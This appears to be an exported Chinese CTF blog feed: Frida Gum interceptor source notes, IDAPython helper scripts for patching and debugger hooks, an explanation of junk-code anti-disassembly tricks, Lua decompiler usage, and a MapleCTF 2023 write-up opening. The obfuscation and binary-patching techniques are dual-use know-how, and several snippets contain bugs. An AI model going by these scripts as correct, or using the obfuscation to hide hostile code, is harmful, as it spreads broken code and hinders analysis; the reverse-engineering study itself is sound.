(address);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GUM_DISASM_NEXT() \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!cs_disasm_iter (capstone, &amp;code, &amp;size, &amp;pc, insn)) \</span></span><br><span class="line"><span class="meta">      goto beach; \</span></span><br><span class="line"><span class="meta">    ops = insn-&gt;detail-&gt;arm64.operands</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GUM_CHECK_ID(i) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (insn-&gt;id != G_PASTE (ARM64_INS_, i)) \</span></span><br><span class="line"><span class="meta">      goto beach</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GUM_CHECK_OP_TYPE(n, t) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ops[n].type != G_PASTE (ARM64_OP_, t)) \</span></span><br><span class="line"><span class="meta">      goto beach</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GUM_CHECK_OP_REG(n, r) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ops[n].reg != G_PASTE (ARM64_REG_, r)) \</span></span><br><span class="line"><span class="meta">      goto beach</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GUM_CHECK_OP_MEM(n, b, i, d) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ops[n].mem.base != G_PASTE (ARM64_REG_, b)) \</span></span><br><span class="line"><span class="meta">      goto beach; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ops[n].mem.index != G_PASTE (ARM64_REG_, i)) \</span></span><br><span class="line"><span class="meta">      goto beach; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ops[n].mem.disp != d) \</span></span><br><span class="line"><span class="meta">      goto beach</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">GUM_DISASM_NEXT</span> ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (insn-&gt;id)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> ARM64_INS_B:</span><br><span class="line">      result = <span class="built_in">GSIZE_TO_POINTER</span> (ops[<span class="number">0</span>].imm);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_DARWIN</span></span><br><span class="line">    <span class="keyword">case</span> ARM64_INS_ADRP:</span><br><span class="line">    &#123;</span><br><span class="line">      GumAddress target;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">0</span>, X17);</span><br><span class="line">      target = ops[<span class="number">1</span>].imm;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">GUM_DISASM_NEXT</span> ();</span><br><span class="line">      <span class="built_in">GUM_CHECK_ID</span> (ADD);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">0</span>, X17);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">1</span>, X17);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_TYPE</span> (<span class="number">2</span>, IMM);</span><br><span class="line">      target += ops[<span class="number">2</span>].imm;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">GUM_DISASM_NEXT</span> ();</span><br><span class="line">      <span class="built_in">GUM_CHECK_ID</span> (LDR);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">0</span>, X16);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_TYPE</span> (<span class="number">1</span>, MEM);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_MEM</span> (<span class="number">1</span>, X17, INVALID, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">GUM_DISASM_NEXT</span> ();</span><br><span class="line">      <span class="built_in">GUM_CHECK_ID</span> (BRAA);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">0</span>, X16);</span><br><span class="line">      <span class="built_in">GUM_CHECK_OP_REG</span> (<span class="number">1</span>, X17);</span><br><span class="line"></span><br><span class="line">      result = *((gpointer *) <span class="built_in">GSIZE_TO_POINTER</span> (target));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">beach:</span><br><span class="line">  <span class="built_in">cs_free</span> (insn, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cs_close</span> (&amp;capstone);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建拦截器后端以及分配器初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">gum_interceptor_init</span> (GumInterceptor * self)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">g_rec_mutex_init</span> (&amp;self-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  self-&gt;function_by_address = <span class="built_in">g_hash_table_new_full</span> (<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">      (GDestroyNotify) gum_function_context_destroy);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gum_code_allocator_init</span> (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gum_interceptor_transaction_init</span> (&amp;self-&gt;current_transaction, self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>goAst初探</title>
    <url>/2023/11/09/goAst%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="占坑晚点来学学goastpy啥的"><a class="markdownIt-Anchor" href="#占坑晚点来学学goastpy啥的">#</a> 占坑，晚点来学学 goastpy 啥的</h6>
<span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>idapython初探</title>
    <url>/2023/10/12/idapython%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface确实不熟但是确实该学学一些自动化东西反正萌新么记录一下"><a class="markdownIt-Anchor" href="#preface确实不熟但是确实该学学一些自动化东西反正萌新么记录一下">#</a> PREFACE：确实不熟，但是确实该学学一些自动化东西，反正萌新么记录一下</h6>
<h6 id="1112发现这个httpsbbskanxuecomthread-225920htm"><a class="markdownIt-Anchor" href="#1112发现这个httpsbbskanxuecomthread-225920htm">#</a> 11.12：发现这个<a href="https://bbs.kanxue.com/thread-225920.htm"> https://bbs.kanxue.com/thread-225920.htm</a></h6>
<span id="more"></span>
<ul>
<li>批量获取函数 Xref</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: addr : hex</span></span><br><span class="line"><span class="string">ret: XrefList : list</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XrefList</span>(<span class="params">addr</span>):</span><br><span class="line">    x_list = []</span><br><span class="line">    <span class="keyword">for</span> x_addr <span class="keyword">in</span> XrefsTo(addr, flags=<span class="number">0</span>):</span><br><span class="line">        x_list.append(<span class="built_in">hex</span>(addr.frm))</span><br><span class="line">    <span class="keyword">return</span> x_list</span><br></pre></td></tr></table></figure>
<ul>
<li>返回函数参数（todo，有点难度的）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_idp</span><br><span class="line"><span class="keyword">import</span> ida_search</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_function_arg</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 使用 idc.prev_head 而不是 ida_bytes.prev_head</span></span><br><span class="line">        addr = idc.prev_head(addr, ida_ida.cvar.inf.min_ea)</span><br><span class="line">        <span class="comment"># 使用 idc.get_mnem 而不是 GetMnem</span></span><br><span class="line">        <span class="keyword">if</span> idc.get_mnem(addr) == <span class="string">&quot;mov&quot;</span> <span class="keyword">and</span> <span class="string">&quot;esi&quot;</span> <span class="keyword">in</span> idc.get_operand_value(addr, <span class="number">0</span>):</span><br><span class="line">            <span class="comment"># 使用 idc.get_operand_value 而不是 GetOperandValue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;We found it at 0x%x&quot;</span> % idc.get_operand_value(addr, <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你的目标地址</span></span><br><span class="line">find_function_arg(<span class="number">0x5D2966</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>从地址返回指令</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: addr : hex</span></span><br><span class="line"><span class="string">ret: [addr, mnemonic, op_str]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_asm_from_addr</span>(<span class="params">addr</span>):</span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line">    <span class="comment"># 创建一个 insn_t 对象来存储解码的指令</span></span><br><span class="line">    insn = ida_ua.insn_t()</span><br><span class="line">    ida_ua.decode_insn(insn, addr)</span><br><span class="line">    insn_bytes = ida_bytes.get_bytes(addr, insn.size)</span><br><span class="line">    <span class="comment"># 打印指令的助记符和操作数</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(insn_bytes, addr):</span><br><span class="line">        x.append(<span class="built_in">hex</span>(i.address))</span><br><span class="line">        x.append(i.mnemonic)</span><br><span class="line">        x.append(i.op_str)</span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<ul>
<li>找到特定的十六进制（全段查找）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: hex_of_pattern : str</span></span><br><span class="line"><span class="string">ret: void</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pattern</span>(<span class="params">bytes_to_find</span>): <span class="comment"># 例如 &quot;FF E0&quot;</span></span><br><span class="line">    <span class="keyword">for</span> seg_ea <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        seg_end = idc.get_segm_end(seg_ea)</span><br><span class="line">        ea = seg_ea</span><br><span class="line">        <span class="keyword">while</span> (ea &lt;= seg_end):</span><br><span class="line">            ea = idaapi.find_binary(ea, seg_end, bytes_to_find, <span class="number">16</span>, idaapi.SEARCH_DOWN)</span><br><span class="line">            <span class="keyword">if</span> ea != idaapi.BADADDR:</span><br><span class="line">                <span class="comment"># 这里填写需要的处理逻辑，ea即找到的地址</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line">            ea = idc.next_head(ea)</span><br></pre></td></tr></table></figure>
<ul>
<li>查找特定的汇编地址（全段查找）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: assembly_code : str</span></span><br><span class="line"><span class="string">ret: void</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pattern</span>(<span class="params">assembly_code</span>):</span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">    new_bytes , _= ks.asm(assembly_code)</span><br><span class="line">    new_bytes = [<span class="built_in">hex</span>(new_bytes[i])[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(new_bytes), <span class="number">1</span>)]</span><br><span class="line">    new_bytes = <span class="string">&#x27; &#x27;</span>.join(new_bytes)</span><br><span class="line">    <span class="keyword">for</span> seg_ea <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        seg_end = idc.get_segm_end(seg_ea)</span><br><span class="line">        ea = seg_ea</span><br><span class="line">        <span class="keyword">while</span> (ea &lt;= seg_end):</span><br><span class="line">            ea = idaapi.find_binary(ea, seg_end, new_bytes , <span class="number">16</span>, idaapi.SEARCH_DOWN)</span><br><span class="line">            <span class="keyword">if</span> ea != idaapi.BADADDR:</span><br><span class="line">                <span class="comment"># 这里填写需要的处理逻辑，ea即找到的地址</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line">            ea = idc.next_head(ea)</span><br></pre></td></tr></table></figure>
<ul>
<li>查找某条地址的上一条汇编地址信息</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: addr : str</span></span><br><span class="line"><span class="string">ret: addr : hex</span></span><br><span class="line"><span class="string">  , len_of_opcode : int</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_prev_addr</span>(<span class="params">addr</span>):</span><br><span class="line">  prev_inst_addr = ida_bytes.prev_head(address, ida_ida.cvar.inf.min_ea)</span><br><span class="line">    prev_inst_size = ida_bytes.get_item_size(prev_inst_addr)</span><br><span class="line">    <span class="keyword">return</span> prev_inst_addr, prev_inst_size</span><br></pre></td></tr></table></figure>
<ul>
<li>patch 脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">arg: addr : str</span></span><br><span class="line"><span class="string">   assembly_code : str</span></span><br><span class="line"><span class="string">ret: void</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_addr</span>(<span class="params">addr, assembly_code</span>)</span><br><span class="line">  new_bytes , _= ks.asm(assembly_code)</span><br><span class="line">  new_bytes = [(new_bytes[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(new_bytes), <span class="number">1</span>)]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(prev_inst_addr, prev_inst_addr + <span class="built_in">len</span>(new_bytes), <span class="number">1</span>):</span><br><span class="line">        patch_byte(i, new_bytes[j])</span><br><span class="line">        j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>批量 hook</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyDbgHook</span>(idaapi.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="keyword">if</span> ea <span class="keyword">in</span> addresses_to_hook:</span><br><span class="line">            <span class="comment"># 设置处理逻辑</span></span><br><span class="line">            rax_value = ida_dbg.get_reg_val(<span class="string">&quot;RAX&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Breakpoint at 0x%X, RAX = 0x%X&quot;</span> % (ea, rax_value))</span><br><span class="line">            ida_dbg.continue_process()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化并注册我们的调试器 hook</span></span><br><span class="line">debug_hook = MyDbgHook()</span><br><span class="line">debug_hook.hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为列表中的每个地址设置断点</span></span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> addresses_to_hook:</span><br><span class="line">    idc.add_bpt(address, <span class="number">0</span>, idc.BPT_SOFT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动或继续调试过程</span></span><br><span class="line">ida_dbg.run_requests()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>junk code demo</title>
    <url>/2023/07/18/junk-code-demo/</url>
    <content><![CDATA[<h6 id="大概是二三月份遇到了一个题出了一个有点意思的花想着可以看看对应这种花写了个简单的源码随机加花器-不是什么高深的技术但是也顺便把ida这类线性扫描反汇编和递归下降反汇编弄清楚点以后ida抽风的时候也更清楚点为啥"><a class="markdownIt-Anchor" href="#大概是二三月份遇到了一个题出了一个有点意思的花想着可以看看对应这种花写了个简单的源码随机加花器-不是什么高深的技术但是也顺便把ida这类线性扫描反汇编和递归下降反汇编弄清楚点以后ida抽风的时候也更清楚点为啥">#</a> 大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把 IDA 这类线性扫描反汇编和递归下降反汇编弄清楚点，<s>以后 IDA 抽风的时候也更清楚点为啥</s></h6>
<span id="more"></span>
<h4 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理：</h4>
<h6 id="来源于-idapro权威指南"><a class="markdownIt-Anchor" href="#来源于-idapro权威指南">#</a> 来源于 IDAPro 权威指南</h6>
<h5>
<details> <summary>线性扫描反汇编</summary>
<p><img loading="lazy" data-src="junk-code-demo/image-20230718011401924.png" alt="image-20230718011401924"></p>
</details>
</h5>
<h5>
<details> <summary>递归下降反汇编</summary>
<p><img loading="lazy" data-src="junk-code-demo/image-20230718011457626.png" alt="image-20230718011457626"></p>
<p><img loading="lazy" data-src="junk-code-demo/image-20230718011531171.png" alt="image-20230718011531171"></p>
<p><img loading="lazy" data-src="junk-code-demo/image-20230718011544013.png" alt="image-20230718011544013"></p>
</details>
</h5>
<h5 id="这里主要看递归下降反汇编方式"><a class="markdownIt-Anchor" href="#这里主要看递归下降反汇编方式">#</a> 这里主要看递归下降反汇编方式</h5>
<h5 id="首先明确idapro的反汇编均为静态进行-根据条件分支指令可以构造入门的junk-instructions如jzjnz或者永真假条件jzjnz类型注意后者在构造时需要考虑编译器优化问题"><a class="markdownIt-Anchor" href="#首先明确idapro的反汇编均为静态进行-根据条件分支指令可以构造入门的junk-instructions如jzjnz或者永真假条件jzjnz类型注意后者在构造时需要考虑编译器优化问题">#</a> 首先明确 IDAPro 的反汇编均为静态进行。根据条件分支指令可以构造入门的 junk instructions 如 (jz+jnz) 或者永真 / 假条件 + jz/jnz 类型（注意：后者在构造时需要考虑编译器优化问题）</h5>
<h5 id="实际上根据上面这个跳转问题就可以构造一种花在虚假的控制流中间加入诸如破坏栈帧的junk-code导致反编译失败-不过实践应该是没什么用的毕竟去虚假控制流的最常见思路就是模拟动态执行顺带就把花拿下了"><a class="markdownIt-Anchor" href="#实际上根据上面这个跳转问题就可以构造一种花在虚假的控制流中间加入诸如破坏栈帧的junk-code导致反编译失败-不过实践应该是没什么用的毕竟去虚假控制流的最常见思路就是模拟动态执行顺带就把花拿下了">#</a> 实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的 junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）</h5>
<h5 id="如果能理解这个最基本的例子原理大概可以找到一种构造反汇编的通式用构造永真条件跳转逻辑在产生的虚假的控制流中塞入junk-code使得反汇编失效"><a class="markdownIt-Anchor" href="#如果能理解这个最基本的例子原理大概可以找到一种构造反汇编的通式用构造永真条件跳转逻辑在产生的虚假的控制流中塞入junk-code使得反汇编失效">#</a> 如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式： <code>用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效</code></h5>
<h5 id="然后配合一些小小的汇编知识就可以产生奇妙的效果"><a class="markdownIt-Anchor" href="#然后配合一些小小的汇编知识就可以产生奇妙的效果">#</a> 然后，配合一些小小的汇编知识，就可以产生奇妙的效果</h5>
<h5 id="例如call指令正常情况下不会指向其他call-retn间的地址但通过asm汇编内联可以让call指向一个最近的相对地址同时__不维护条件寄存器__通过该条件寄存器控制永真逻辑-当调用retn的时候返回call下面的条件寄存器会重复修改-中间的代码在ida优化过程中是假逻辑但构造运行两次后变为永真-可能有点抽象这里写了个小demojunkcodereadmemd-at-main-demoyao100junkcode-githubcom"><a class="markdownIt-Anchor" href="#例如call指令正常情况下不会指向其他call-retn间的地址但通过asm汇编内联可以让call指向一个最近的相对地址同时__不维护条件寄存器__通过该条件寄存器控制永真逻辑-当调用retn的时候返回call下面的条件寄存器会重复修改-中间的代码在ida优化过程中是假逻辑但构造运行两次后变为永真-可能有点抽象这里写了个小demojunkcodereadmemd-at-main-demoyao100junkcode-githubcom">#</a> 例如，call 指令正常情况下不会指向其他 call retn 间的地址，但通过 asm 汇编内联，可以让 call 指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用 retn 的时候返回 call，下面的条件寄存器会重复修改。中间的代码在 IDA 优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小 demo](<a href="https://github.com/DeMoYao100/junkCode">junkCode/README.md at main · DeMoYao100/junkCode (github.com)</a>)</h5>
<h5 id="其实基本上看懂这个demo就能搞明白上面这个通式了这里修改寄存器-或者其它构造虚假控制流的方法可就多种多样了疑似是之前看过构造rop链劫持控制流的题无心之举导致的反编译失效也没必要深究遇到之后再分析就行"><a class="markdownIt-Anchor" href="#其实基本上看懂这个demo就能搞明白上面这个通式了这里修改寄存器-或者其它构造虚假控制流的方法可就多种多样了疑似是之前看过构造rop链劫持控制流的题无心之举导致的反编译失效也没必要深究遇到之后再分析就行">#</a> 其实基本上看懂这个 demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造 rop 链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行</h5>
<h5 id="然后是函数指针篡改感觉一出现ida很容易抽风基本上就是动调的时候修就行除非恶意构造"><a class="markdownIt-Anchor" href="#然后是函数指针篡改感觉一出现ida很容易抽风基本上就是动调的时候修就行除非恶意构造">#</a> 然后是函数指针篡改，感觉一出现 ida 很容易抽风，基本上就是动调的时候修就行（除非恶意构造）</h5>
<h6 id="最后立个flag有空把ida反编译也写一篇ida反编译是真喜欢抽风啊-虽然这俩并不是啥必要学的东西也不难但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"><a class="markdownIt-Anchor" href="#最后立个flag有空把ida反编译也写一篇ida反编译是真喜欢抽风啊-虽然这俩并不是啥必要学的东西也不难但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助">#</a> 最后立个 flag，有空把 IDA 反编译也写一篇<s> ida 反编译是真喜欢抽风啊</s>。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助</h6>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>laurelAndYanny</title>
    <url>/2023/11/26/laurelAndYanny/</url>
    <content><![CDATA[<h6 id="preface宿舍传了一个wwwxiaohongshucom视频就是那个mimi和gulu混淆那个声音-然后传给一个复旦做aigc的爷想着要不要写个小工具玩玩鸽子叫"><a class="markdownIt-Anchor" href="#preface宿舍传了一个wwwxiaohongshucom视频就是那个mimi和gulu混淆那个声音-然后传给一个复旦做aigc的爷想着要不要写个小工具玩玩鸽子叫">#</a> PREFACE：宿舍传了一个<a href="https://www.xiaohongshu.com/discovery/item/655e08f10000000032030e79?app_platform=ios&amp;app_version=8.14.3&amp;share_from_user_hidden=true&amp;type=video&amp;xhsshare=WeixinSession&amp;appuid=61a4c0af000000000201859a&amp;apptime=1700751420"> www.xiaohongshu.com</a> 视频，就是那个 mimi 和 gulu 混淆那个声音。然后传给一个复旦做 aigc 的爷，想着要不要写个小工具玩玩 (鸽子叫)</h6>
<h6 id="这两天总算ddl弄了一下来做下子信息收集才发现已有一些研究"><a class="markdownIt-Anchor" href="#这两天总算ddl弄了一下来做下子信息收集才发现已有一些研究">#</a> 这两天总算 ddl 弄了一下，来做下子信息收集，才发现已有一些研究</h6>
<span id="more"></span>
<p>历史小故事</p>
<p><a href="https://zh.wikipedia.org/wiki/Laurel%E6%88%96Yanny%E7%88%AD%E8%AB%96">Laurel 或 Yanny 争论 - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
<p>好玩的工具 (一开始我们想实现的效果，不过既然有人做了～)：</p>
<p><a href="https://www.nytimes.com/interactive/2018/05/16/upshot/audio-clip-yanny-laurel-debate.html">We Made a Tool So You Can Hear Both Yanny and Laurel - The New York Times (nytimes.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>lua初探</title>
    <url>/2023/11/08/lua%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface一直不会搞lua题稍微整理和学习一下"><a class="markdownIt-Anchor" href="#preface一直不会搞lua题稍微整理和学习一下">#</a> PREFACE：一直不会搞 lua 题，稍微整理和学习一下</h6>
<span id="more"></span>
<p>偷了一些<a href="https://www.cnblogs.com/lordtianqiyi/articles/17000585.html">这篇博客</a>来学习学习</p>
<h5 id="lua编译"><a class="markdownIt-Anchor" href="#lua编译">#</a> lua 编译：</h5>
<ul>
<li>Luac</li>
<li>Luajit</li>
</ul>
<h5 id="反编译"><a class="markdownIt-Anchor" href="#反编译">#</a> 反编译：</h5>
<p>unluac：<a href="https://sourceforge.net/projects/unluac/">https://sourceforge.net/projects/unluac/</a></p>
<p>处理 lua5.0 - lua5.4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar unluac.jar luac.out &gt; 3.lua</span><br><span class="line">java -jar unluac.jar --rawstring luac.out &gt; 3.lua</span><br></pre></td></tr></table></figure>
<h4 id="2-luadec"><a class="markdownIt-Anchor" href="#2-luadec">#</a> 2、LuaDec</h4>
<p><a href="https://github.com/viruscamp/luadec">https://github.com/viruscamp/luadec</a></p>
<p>主要针对 lua5.1，对 lua5.2 和 lua5.3 是实验性的 ， 依赖 lua 源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libreadline-dev </span><br><span class="line"></span><br><span class="line">git clone https://github.com/viruscamp/luadec</span><br><span class="line">cd luadec</span><br><span class="line">git submodule update --init lua-5.3   # lua5.2 就替换成 lua-5.2 下面也是一样</span><br><span class="line">cd lua-5.3</span><br><span class="line">make linux</span><br><span class="line">cd ../luadec</span><br><span class="line">make LUAVER=5.3</span><br></pre></td></tr></table></figure>
<p>参数介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-pn  : 打印函数嵌套结构</span><br><span class="line">-dis : 反汇编luac.out或lua源码  # 这里的反汇编指的是生成字节码</span><br><span class="line">luadec abc.lua 或 luadec  luac.out :  反编译lua源码或luac二进制文件  #这里的反编译指的是生成lua源码</span><br></pre></td></tr></table></figure>
<hr>
<h6 id="工具先放上面找一个实战的题来看看这个是rctf2022-的-picstore"><a class="markdownIt-Anchor" href="#工具先放上面找一个实战的题来看看这个是rctf2022-的-picstore">#</a> 工具先放上面，找一个实战的题来看看，这个是 RCTF2022 的 picStore</h6>
<p>题目给出的 picStore.bin 是一个 lua 二进制块，原理可以参考这篇：<a href="https://zhuanlan.zhihu.com/p/429597744">Lua 源码分析（一）二进制块的加载 - 知乎 (zhihu.com)</a></p>
<p><img loading="lazy" data-src="lua%E5%88%9D%E6%8E%A2/image-20231109152335694.png" alt="image-20231109152335694"></p>
<p><s>接着上面 blog 的做了一遍… 懒得写了…</s></p>
]]></content>
  </entry>
  <entry>
    <title>mapleCTF2023</title>
    <url>/2023/10/01/mapleCTF2023/</url>
    <content><![CDATA[<h6 id="preface-maple前四个题做的挺快的还看题的队甚至小冲分了一下什"><a class="markdownIt-Anchor" href="#preface-maple前四个题做的挺快的还看题的队甚至小冲分了一下什">#</a> PREFACE: maple 前四个题做的挺快的还，看题的队甚至小冲分了一下（什）</h6>
<h6 id="最后那个安卓确实出的有点问题怎么都搜不出来总的来说算是还好的比赛吧"><a class="markdownIt-Anchor" href="#最后那个安卓确实出的有点问题怎么都搜不出来总的来说算是还好的比赛吧">#</a> 最后那个安卓确实出的有点问题，怎么都搜不出来，总的来说算是还好的比赛吧</h6>
<h6 id="102-算是出了不过确实看着别的师傅有点算法高手的"><a class="markdownIt-Anchor" href="#102-算是出了不过确实看着别的师傅有点算法高手的">#</a> 10.2: 算是出了，不过确实看着别的师傅有点算法高手的</h6>
<span id="more"></span>
<h3 id="baby_rev"><a class="markdownIt-Anchor" href="#baby_rev">#</a> baby_rev</h3>
<p>就是一些 check，比较容易，后面注意分两段输入，否则可能有问题</p>
